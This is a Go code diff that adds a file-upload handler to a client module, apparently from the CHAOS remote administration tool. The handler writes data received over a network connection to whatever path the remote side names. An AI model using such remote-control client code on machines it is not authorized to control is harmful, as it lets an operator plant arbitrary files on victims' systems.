@@ -6,8 +6,10 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
+	osUtil "github.com/tiagorlampert/CHAOS/client/app/util/os"
 	"net"
 	"os"
+	"path/filepath"
 )
 
 type UploadUseCase struct {
@@ -20,27 +22,35 @@ func NewUploadUseCase(conn net.Conn) usecase.Upload {
 	}
 }
 
-func (u UploadUseCase) ValidatePath() {
-	data, err := network.Read(u.Connection)
-	if err != nil {
-		log.WithField("cause", err.Error()).Error("error reading path")
-	}
+func (u UploadUseCase) File(data []byte) {
+	var errMsg models.Error
 
-	var response models.Response
-	if _, err := os.Stat(string(data)); os.IsNotExist(err) {
-		response.Error = true
-	}
-
-	marshal, err := json.Marshal(response)
-	if err != nil {
+	var upload models.Upload
+	if err := json.Unmarshal(data, &upload); err != nil {
 		log.Error(err)
+		errMsg.HasError = true
+		errMsg.Message = err.Error()
 	}
 
-	if err = network.Send(u.Connection, marshal); err != nil {
+	dir, _ := filepath.Split(upload.FilepathTo)
+	if _, err := os.Stat(dir); os.IsNotExist(err) {
+		log.Error(err)
+		errMsg.HasError = true
+		errMsg.Message = err.Error()
+	}
+
+	if !errMsg.HasError {
+		if err := osUtil.WriteFile(upload.FilepathTo, upload.Data); err != nil {
+			log.Error(err)
+			errMsg.HasError = true
+			errMsg.Message = err.Error()
+		}
+	}
+
+	if err := network.Send(u.Connection, models.Message{
+		Command: "upload",
+		Error:   errMsg,
+	}); err != nil {
 		log.WithField("cause", err.Error()).Error("error sending upload response")
 	}
-}
-
-func (u UploadUseCase) StoreFile() {
-	panic("implement me")
 }
